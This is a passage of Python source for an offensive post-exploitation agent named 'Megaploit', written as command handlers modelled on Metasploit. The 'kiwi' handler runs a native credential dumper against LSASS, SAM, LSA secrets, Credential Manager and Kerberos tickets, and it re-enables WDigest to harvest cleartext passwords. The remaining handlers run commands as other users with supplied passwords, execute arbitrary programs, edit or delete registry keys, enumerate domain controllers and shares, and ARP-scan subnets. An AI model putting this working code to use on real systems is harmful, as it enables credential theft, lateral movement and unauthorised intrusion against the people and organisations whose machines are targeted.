            "    If the browser is open, try again after closing it (DB lock).\n"
            "    On Linux without 'cryptography' pip package, install it:\n"
            "      pip install cryptography"
        )

    return "\n".join(output)


# ---------------------------------------------------------------------------
# Kiwi — native C credential dumper (Windows)
# ---------------------------------------------------------------------------

@_register("kiwi")
def _kiwi(conn, args: list[str]) -> str:
    """
    Megaploit Kiwi — advanced Windows credential harvester backed by a
    compiled C binary (megaploit_kiwi.exe / megaploit_kiwi).

    The binary is compiled on first use from
    megaploit/native/kiwi/megaploit_kiwi.c (requires gcc / MinGW-w64 / MSVC).

    Usage:  kiwi <module>  [args]

    Modules
    -------
      logonpasswords   LSASS process memory — NTLM hashes + cleartext
      sam              SAM hive offline dump — local account hashes
      lsa              LSA secrets dump
      credman          Windows Credential Manager stored passwords
      tickets          Kerberos TGT/TGS ticket cache
      wdigest          Re-enable WDigest cleartext + harvest
      dpapi            DPAPI masterkey GUID enumeration
      all              Run every module

    Requires
    --------
      logonpasswords / sam / lsa : SYSTEM or SeDebugPrivilege (use getsystem first)
      credman / tickets / dpapi  : current interactive user
    """
    module = args[0].lower() if args else ""
    if not module:
        return (
            "Usage: kiwi <module>\n"
            "Modules: logonpasswords sam lsa credman tickets wdigest dpapi all"
        )

    # Dynamically import kiwi_runner so the agent does not need it at load time
    try:
        import importlib.util as _ilu
        import os as _os
        _runner_path = _os.path.join(
            _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),
            "native", "kiwi", "kiwi_runner.py"
        )
        _spec = _ilu.spec_from_file_location("kiwi_runner", _runner_path)
        _mod  = _ilu.module_from_spec(_spec)      # type: ignore[arg-type]
        _spec.loader.exec_module(_mod)             # type: ignore[union-attr]
        extra = args[1:] if len(args) > 1 else []
        return _mod.run_kiwi(module, extra_args=extra)
    except Exception as exc:
        return f"[-] kiwi: runner error — {exc}"


# ===========================================================================
# Gaps vs Metasploit — new handlers
# ===========================================================================

# ---------------------------------------------------------------------------
# Gap 1 — run_as / execute_process
# ---------------------------------------------------------------------------

@_register("run_as")
def _run_as(conn, args: list[str]) -> str:
    """
    Run a command as a different user.
    Windows: uses runas / LogonUser + CreateProcessWithLogonW.
    Unix:    uses su -c or sudo -u.
    Usage: run_as <user> <password> <command>
    """
    if len(args) < 3:
        return "Usage: run_as <user> <password> <command>"
    user, password = args[0], args[1]
    cmd = " ".join(args[2:])

    if sys.platform == "win32":
        try:
            import ctypes, ctypes.wintypes as wt
            LOGON32_LOGON_INTERACTIVE = 2
            LOGON32_PROVIDER_DEFAULT  = 0
            CREATE_NEW_CONSOLE        = 0x10
            domain = "."

            h_token = wt.HANDLE()
            ok = ctypes.windll.advapi32.LogonUserW(
                user, domain, password,
                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
                ctypes.byref(h_token)
            )
            if not ok:
                err_code = ctypes.windll.kernel32.GetLastError()
                return f"[-] LogonUser failed (error {err_code})"

            # Use CreateProcessWithLogonW to run and capture output via a pipe
            import tempfile, uuid as _uuid
            out_path = os.path.join(tempfile.gettempdir(),
                                    f"_mpl_runas_{_uuid.uuid4().hex[:8]}.txt")
            full_cmd = f'cmd /c {cmd} > "{out_path}" 2>&1'

            class STARTUPINFOW(ctypes.Structure):
                _fields_ = [
                    ("cb",            wt.DWORD), ("lpReserved", wt.LPWSTR),
                    ("lpDesktop",     wt.LPWSTR), ("lpTitle",   wt.LPWSTR),
                    ("dwX",           wt.DWORD), ("dwY",        wt.DWORD),
                    ("dwXSize",       wt.DWORD), ("dwYSize",    wt.DWORD),
                    ("dwXCountChars", wt.DWORD), ("dwYCountChars", wt.DWORD),
                    ("dwFillAttribute", wt.DWORD), ("dwFlags",  wt.DWORD),
                    ("wShowWindow",   wt.WORD),  ("cbReserved2", wt.WORD),
                    ("lpReserved2",   ctypes.c_char_p),
                    ("hStdInput",     wt.HANDLE), ("hStdOutput", wt.HANDLE),
                    ("hStdError",     wt.HANDLE),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", wt.HANDLE), ("hThread", wt.HANDLE),
                    ("dwProcessId", wt.DWORD), ("dwThreadId", wt.DWORD),
                ]

            si = STARTUPINFOW()
            si.cb = ctypes.sizeof(si)
            pi = PROCESS_INFORMATION()
            LOGON_WITH_PROFILE = 1

            created = ctypes.windll.advapi32.CreateProcessWithLogonW(
                user, domain, password,
                LOGON_WITH_PROFILE,
                None, full_cmd,
                CREATE_NEW_CONSOLE,
                None, None,
                ctypes.byref(si), ctypes.byref(pi)
            )
            ctypes.windll.kernel32.CloseHandle(h_token)

            if not created:
                err_code = ctypes.windll.kernel32.GetLastError()
                return f"[-] CreateProcessWithLogonW failed (error {err_code})"

            # Wait for process to finish (max 30s)
            ctypes.windll.kernel32.WaitForSingleObject(pi.hProcess, 30000)
            ctypes.windll.kernel32.CloseHandle(pi.hProcess)
            ctypes.windll.kernel32.CloseHandle(pi.hThread)

            try:
                with open(out_path, "r", encoding="utf-8", errors="replace") as fh:
                    output = fh.read()
                os.remove(out_path)
                return output.strip() or "(no output)"
            except OSError:
                return "[+] Process finished (no output captured)"

        except Exception as e:
            return f"[-] run_as: {e}"

    else:
        # Unix: try sudo -u <user> or su
        if shutil.which("sudo"):
            try:
                proc = subprocess.run(
                    ["sudo", "-u", user, "-S", "sh", "-c", cmd],
                    input=password.encode() + b"\n",
                    capture_output=True, timeout=30
                )
                output = (proc.stdout + proc.stderr).decode(errors="replace").strip()
                return output or f"[+] Command ran as {user} (no output)"
            except Exception as e:
                return f"[-] sudo run_as: {e}"
        # fallback: su -c
        try:
            proc = subprocess.run(
                ["su", "-c", cmd, user],
                input=password.encode() + b"\n",
                capture_output=True, timeout=30
            )
            return (proc.stdout + proc.stderr).decode(errors="replace").strip() or "(no output)"
        except Exception as e:
            return f"[-] su run_as: {e}"


@_register("execute")
def _execute(conn, args: list[str]) -> str:
    """
    Execute an arbitrary program and return stdout+stderr.
    Unlike the shell fallback, this accepts an explicit executable path and
    separate argument list, which allows running binaries that contain spaces
    or are not on PATH.
    Usage: execute <exe> [args...]
    """
    if not args:
        return "Usage: execute <exe> [args...]"
    try:
        proc = subprocess.run(
            args,
            capture_output=True, timeout=60
        )
        output = (proc.stdout + proc.stderr).decode(errors="replace").strip()
        return output or f"[+] Exit {proc.returncode} (no output)"
    except FileNotFoundError:
        return f"[-] Not found: {args[0]}"
    except subprocess.TimeoutExpired:
        return "[-] Timed out (60s)"
    except Exception as e:
        return f"[-] execute: {e}"


# ---------------------------------------------------------------------------
# Gap 2 — reg command (Windows registry CRUD)
# ---------------------------------------------------------------------------

@_register("reg")
def _reg(conn, args: list[str]) -> str:
    """
    Read, write, or delete Windows registry keys/values.
    Usage:
      reg query  <HIVE\\key>                       — list values
      reg get    <HIVE\\key> <value_name>           — read one value
      reg set    <HIVE\\key> <value_name> <REG_type> <data>
      reg delete <HIVE\\key> [value_name]           — delete value or whole key

    HIVE shortcuts: HKLM, HKCU, HKCR, HKU, HKCC
    REG_type: REG_SZ, REG_DWORD, REG_QWORD, REG_BINARY, REG_EXPAND_SZ, REG_MULTI_SZ
    """
    if sys.platform != "win32":
        return "[-] reg is Windows-only"
    if not args:
        return (
            "Usage:\n"
            "  reg query  <HIVE\\\\key>\n"
            "  reg get    <HIVE\\\\key> <value_name>\n"
            "  reg set    <HIVE\\\\key> <value_name> <REG_type> <data>\n"
            "  reg delete <HIVE\\\\key> [value_name]"
        )

    try:
        import winreg

        HIVE_MAP = {
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKCU": winreg.HKEY_CURRENT_USER,
            "HKCR": winreg.HKEY_CLASSES_ROOT,
            "HKU":  winreg.HKEY_USERS,
            "HKCC": winreg.HKEY_CURRENT_CONFIG,
            "HKEY_LOCAL_MACHINE":  winreg.HKEY_LOCAL_MACHINE,
            "HKEY_CURRENT_USER":   winreg.HKEY_CURRENT_USER,
            "HKEY_CLASSES_ROOT":   winreg.HKEY_CLASSES_ROOT,
            "HKEY_USERS":          winreg.HKEY_USERS,
            "HKEY_CURRENT_CONFIG": winreg.HKEY_CURRENT_CONFIG,
        }

        TYPE_MAP = {
            "REG_SZ":        winreg.REG_SZ,
            "REG_DWORD":     winreg.REG_DWORD,
            "REG_QWORD":     winreg.REG_QWORD,
            "REG_BINARY":    winreg.REG_BINARY,
            "REG_EXPAND_SZ": winreg.REG_EXPAND_SZ,
            "REG_MULTI_SZ":  winreg.REG_MULTI_SZ,
        }

        def _split_path(path: str):
            """Split  HKLM\\Software\\...  into (hive_handle, sub_key)."""
            parts = path.replace("/", "\\").split("\\", 1)
            hive_name = parts[0].upper()
            sub_key   = parts[1] if len(parts) > 1 else ""
            hive = HIVE_MAP.get(hive_name)
            if hive is None:
                raise ValueError(f"Unknown hive: {hive_name}")
            return hive, sub_key

        subcmd = args[0].lower()

        # ── query ──────────────────────────────────────────────────────────
        if subcmd == "query":
            if len(args) < 2:
                return "Usage: reg query <HIVE\\\\key>"
            hive, sub = _split_path(args[1])
            with winreg.OpenKey(hive, sub, access=winreg.KEY_READ) as k:
                lines = [f"  Key: {args[1]}\n"]
                i = 0
                while True:
                    try:
                        name, data, dtype = winreg.EnumValue(k, i)
                        type_name = next((n for n, v in TYPE_MAP.items() if v == dtype),
                                         str(dtype))
                        lines.append(f"    {name or '(Default)':<36}  {type_name:<16}  {data!r}")
                        i += 1
                    except OSError:
                        break
                # Also enumerate subkeys
                j = 0
                subkeys = []
                while True:
                    try:
                        subkeys.append(winreg.EnumKey(k, j))
                        j += 1
                    except OSError:
                        break
                if subkeys:
                    lines.append(f"\n  Subkeys ({len(subkeys)}):")
                    for sk in subkeys:
                        lines.append(f"    {sk}")
            return "\n".join(lines) if lines else "(no values)"

        # ── get ────────────────────────────────────────────────────────────
        elif subcmd == "get":
            if len(args) < 3:
                return "Usage: reg get <HIVE\\\\key> <value_name>"
            hive, sub = _split_path(args[1])
            val_name  = args[2]
            with winreg.OpenKey(hive, sub, access=winreg.KEY_READ) as k:
                data, dtype = winreg.QueryValueEx(k, val_name)
            type_name = next((n for n, v in TYPE_MAP.items() if v == dtype), str(dtype))
            return f"  {val_name or '(Default)'}  ({type_name})  =  {data!r}"

        # ── set ────────────────────────────────────────────────────────────
        elif subcmd == "set":
            if len(args) < 5:
                return "Usage: reg set <HIVE\\\\key> <value_name> <REG_type> <data>"
            hive, sub  = _split_path(args[1])
            val_name   = args[2]
            type_str   = args[3].upper()
            raw_data   = " ".join(args[4:])
            reg_type   = TYPE_MAP.get(type_str)
            if reg_type is None:
                return f"[-] Unknown REG type: {type_str}.  Valid: {', '.join(TYPE_MAP)}"

            # Coerce data to the correct Python type
            if reg_type == winreg.REG_DWORD:
                data: object = int(raw_data, 0)
            elif reg_type == winreg.REG_QWORD:
                data = int(raw_data, 0)
            elif reg_type == winreg.REG_BINARY:
                data = bytes.fromhex(raw_data.replace(" ", ""))
            elif reg_type == winreg.REG_MULTI_SZ:
                data = raw_data.split("\\0")
            else:
                data = raw_data

            with winreg.CreateKeyEx(hive, sub, access=winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, val_name, 0, reg_type, data)
            return f"[+] Wrote {args[1]}\\{val_name} = {data!r}"

        # ── delete ─────────────────────────────────────────────────────────
        elif subcmd == "delete":
            if len(args) < 2:
                return "Usage: reg delete <HIVE\\\\key> [value_name]"
            hive, sub = _split_path(args[1])
            if len(args) >= 3:
                # Delete a specific value
                val_name = args[2]
                with winreg.OpenKey(hive, sub, access=winreg.KEY_SET_VALUE) as k:
                    winreg.DeleteValue(k, val_name)
                return f"[+] Deleted value: {args[1]}\\{val_name}"
            else:
                # Delete the whole key (must be empty of subkeys)
                winreg.DeleteKey(hive, sub)
                return f"[+] Deleted key: {args[1]}"

        else:
            return f"[-] Unknown reg sub-command: {subcmd}.  Use: query / get / set / delete"

    except FileNotFoundError:
        return f"[-] Key/value not found: {args[1] if len(args) > 1 else '?'}"
    except PermissionError:
        return "[-] Access denied — elevation may be required"
    except Exception as e:
        return f"[-] reg: {e}"


# ---------------------------------------------------------------------------
# Gap 3 — getdesktop / enumdesktops
# ---------------------------------------------------------------------------

@_register("getdesktop")
def _getdesktop(conn, args: list[str]) -> str:
    """Return the name of the current interactive desktop (Windows)."""
    if sys.platform != "win32":
        if sys.platform == "darwin":
            return _shell_exec("osascript -e 'tell application \"System Events\" to get name of every desktop'")
        return _shell_exec("echo $DISPLAY && xrandr --query 2>/dev/null | head -5")
    try:
        import ctypes
        buf = ctypes.create_unicode_buffer(256)
        h = ctypes.windll.user32.GetThreadDesktop(ctypes.windll.kernel32.GetCurrentThreadId())
        ctypes.windll.user32.GetUserObjectInformationW(h, 2, buf, 512, None)
        return f"[*] Current desktop: {buf.value}"
    except Exception as e:
        return f"[-] getdesktop: {e}"


@_register("enumdesktops")
def _enumdesktops(conn, args: list[str]) -> str:
    """Enumerate all desktops in the current window station (Windows)."""
    if sys.platform != "win32":
        return "[-] enumdesktops is Windows-only"
    try:
        import ctypes
        desktops: list[str] = []
        DESKTOPENUMPROC = ctypes.WINFUNCTYPE(
            ctypes.c_bool,
            ctypes.c_wchar_p,
            ctypes.c_long
        )

        def _cb(name, _):
            desktops.append(name)
            return True

        h_winsta = ctypes.windll.user32.GetProcessWindowStation()
        ctypes.windll.user32.EnumDesktopsW(h_winsta, DESKTOPENUMPROC(_cb), 0)
        if desktops:
            return "[+] Desktops:\n" + "\n".join(f"  {d}" for d in desktops)
        return "[-] No desktops enumerated"
    except Exception as e:
        return f"[-] enumdesktops: {e}"


# ---------------------------------------------------------------------------
# Gap 10 — net_view / Windows domain enumeration from agent
# ---------------------------------------------------------------------------

@_register("net_view")
def _net_view(conn, args: list[str]) -> str:
    """
    Enumerate domain computers, shares, and domain controllers visible
    from the agent.  Works on Windows (net view / nltest) and Linux (smb/ldap).
    Usage: net_view [domain]
    """
    domain = args[0] if args else ""
    lines: list[str] = []

    if sys.platform == "win32":
        # List computers visible on the network
        cmd_view = f"net view /domain:{domain}" if domain else "net view"
        lines.append("=== Visible computers ===")
        lines.append(_shell_exec(cmd_view + " 2>&1"))

        # Domain controllers
        lines.append("\n=== Domain controllers ===")
        if domain:
            lines.append(_shell_exec(f"nltest /dclist:{domain} 2>&1"))
        else:
            lines.append(_shell_exec("nltest /dclist 2>&1"))

        # Current domain
        lines.append("\n=== Domain info ===")
        lines.append(_shell_exec("net config workstation 2>&1 | findstr /i \"domain\\|computer\""))

    else:
        # Linux: nmblookup / smbclient / ldapsearch
        lines.append("=== NetBIOS browse ===")
        if shutil.which("nmblookup"):
            query = f"-W {domain} '*'" if domain else "'-'"
            lines.append(_shell_exec(f"nmblookup {query} 2>&1"))
        elif shutil.which("smbclient"):
            flag = f"-W {domain}" if domain else ""
            lines.append(_shell_exec(f"smbclient {flag} -N -L localhost 2>&1"))
        else:
            lines.append("[-] nmblookup/smbclient not found")

        lines.append("\n=== Domain controllers (DNS SRV) ===")
        import socket as _sock
        try:
            dm = domain or ""
            results = _sock.getaddrinfo(f"_ldap._tcp.dc._msdcs.{dm}", None)
            for r in results:
                lines.append(f"  {r[4][0]}")
        except Exception:
            lines.append("(none found via DNS)")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Gap 11 — arp_scan (active ARP scan of subnet from agent)
# ---------------------------------------------------------------------------

@_register("arp_scan")
def _arp_scan(conn, args: list[str]) -> str:
    """
    Actively ARP-scan a subnet from the agent, discovering live hosts even
    when ICMP is filtered.
    Usage: arp_scan <cidr>   e.g. arp_scan 192.168.1.0/24

    Prefers arp-scan (Linux) / arp (Windows) / scapy fallback.
    """
    if not args:
        return "Usage: arp_scan <cidr>"
    cidr = args[0]

    # Validate CIDR
    try:
        import ipaddress
        network = ipaddress.ip_network(cidr, strict=False)
    except ValueError as e:
        return f"[-] Invalid CIDR: {e}"

    # ── Linux: arp-scan tool (most accurate) ──────────────────────────────
    if sys.platform != "win32" and shutil.which("arp-scan"):
        return _shell_exec(f"arp-scan --localnet --interface=eth0 {cidr} 2>&1 || "
                           f"arp-scan --interface=ens33 {cidr} 2>&1 || "
                           f"arp-scan {cidr} 2>&1")

    # ── Pure-Python: send raw ARP probes via scapy (if available) ─────────
    try:
        from scapy.all import ARP, Ether, srp  # type: ignore[import]
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
                     timeout=2, verbose=False)
        if not ans:
            return f"[-] No ARP responses in {cidr}"
        lines = [f"  {'IP ADDRESS':<18} MAC ADDRESS"]
        lines.append("  " + "─" * 40)
        for _, rcv in ans:
            lines.append(f"  {rcv.psrc:<18} {rcv.hwsrc}")
        return "\n".join(lines)
    except ImportError:
        pass

    # ── Windows fallback: ARP cache + ping sweep to populate it ───────────
    if sys.platform == "win32":
        hosts = list(network.hosts())[:256]
        import concurrent.futures
        def _ping(ip):
            subprocess.run(["ping", "-n", "1", "-w", "200", str(ip)],
                           capture_output=True, timeout=2)
        with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
            list(ex.map(_ping, hosts))
        arp_out = _shell_exec("arp -a 2>&1")
        # Filter to only IPs in our target subnet
        lines = [f"[*] ARP cache entries for {cidr}:"]
        for line in arp_out.splitlines():
            for ip in hosts:
                if str(ip) in line:
                    lines.append(f"  {line.strip()}")
                    break
        return "\n".join(lines) if len(lines) > 1 else f"[-] No ARP entries found for {cidr}"

    # ── Linux fallback: nmap ARP ping ─────────────────────────────────────
    if shutil.which("nmap"):
        return _shell_exec(f"nmap -sn -PR {cidr} 2>&1")

    return "[-] No ARP scanning tool found (install arp-scan, scapy, or nmap)"
